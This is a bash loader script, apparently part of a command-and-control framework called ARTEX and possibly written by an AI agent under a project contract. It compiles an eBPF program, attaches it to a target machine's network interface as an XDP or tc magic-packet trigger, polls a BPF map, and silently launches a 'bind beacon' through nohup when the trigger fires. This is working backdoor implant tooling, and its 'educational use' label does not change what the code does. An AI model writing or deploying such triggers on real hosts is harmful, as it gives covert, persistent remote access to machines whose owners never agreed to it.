#!/bin/bash
# ARTEX C2 eBPF 触发器加载脚本(契约 C2_CONTRACTS.md §19 stretch,Agent P)。
# 教育用途:在目标机编译并挂载 XDP/tc 魔法包触发器,轮询命中 map,拉起 bind beacon。
#
# 用法:
#   ./load_trigger.sh <iface> <bind_beacon_path> [trigger_port]
#
# 依赖:clang(-target bpf)、iproute2(ip link xdp / tc)、bpftool(map 轮询)。
# 说明:
#   - 魔法字节固定为 ARTEX 触发器默认序列(与 xdp_trigger.c 的 MAGIC_0..7 默认一致);
#   - 触发一次后脚本退出 beacon 拉起逻辑由调用方决定是否重复;
#   - Ctrl-C 退出时尽力卸载触发器(ip link set dev <iface> xdp off)。

set -u

IFACE="${1:?用法: $0 <iface> <bind_beacon_path> [trigger_port]}"
BEACON="${2:?用法: $0 <iface> <bind_beacon_path> [trigger_port]}"
PORT="${3:-47771}"
DIR="$(cd "$(dirname "$0")" && pwd)"

command -v clang >/dev/null 2>&1 || { echo "[!] 缺少 clang(apt install clang)"; exit 1; }
command -v bpftool >/dev/null 2>&1 || { echo "[!] 缺少 bpftool(linux-tools-generic)"; exit 1; }
[ -f /usr/include/linux/bpf.h ] || { echo "[!] 缺少 linux/bpf.h(linux-libc-dev)"; exit 1; }

echo "[*] 编译触发器(clang -target bpf)..."
clang -O2 -g -target bpf \
	-DTRIGGER_PORT="${PORT}" \
	-c "${DIR}/xdp_trigger.c" -o "${DIR}/trigger.o" || exit 1

echo "[*] 挂载 XDP 到 ${IFACE}(驱动层,失败可回退 tc clsact,见 README)..."
ip link set dev "${IFACE}" xdp off 2>/dev/null
ip link set dev "${IFACE}" xdp obj "${DIR}/trigger.o" sec xdp || {
	echo "[!] XDP 挂载失败,尝试 tc clsact ingress 等价路径"
	tc qdisc replace dev "${IFACE}" clsact 2>/dev/null
	tc filter replace dev "${IFACE}" ingress bpf da obj "${DIR}/trigger.o" sec xdp || {
		echo "[!] tc 挂载也失败(内核/网卡不支持?)"
		exit 1
	}
}

MAP_ID="$(bpftool map show | awk '/trigger_map/{gsub(/:/,"",$1); print $1; exit}')"
[ -n "${MAP_ID}" ] || { echo "[!] 未找到 trigger_map"; exit 1; }
LAST="$(bpftool map dump id "${MAP_ID}" | grep -oE 'value: [0-9]+' | grep -oE '[0-9]+' || echo 0)"

echo "[*] 监听魔法包(udp/${PORT}),Ctrl-C 退出..."
trap 'ip link set dev "${IFACE}" xdp off 2>/dev/null; echo "[*] 触发器已卸载"; exit 0' INT TERM
while :; do
	CUR="$(bpftool map dump id "${MAP_ID}" | grep -oE 'value: [0-9]+' | grep -oE '[0-9]+' || echo 0)"
	if [ "${CUR}" != "0" ] && [ "${CUR}" != "${LAST}" ]; then
		echo "[*] 魔法包命中(ts=${CUR}),拉起 bind beacon: ${BEACON}"
		LAST="${CUR}"
		nohup "${BEACON}" >/dev/null 2>&1 &
	fi
	sleep 1
done
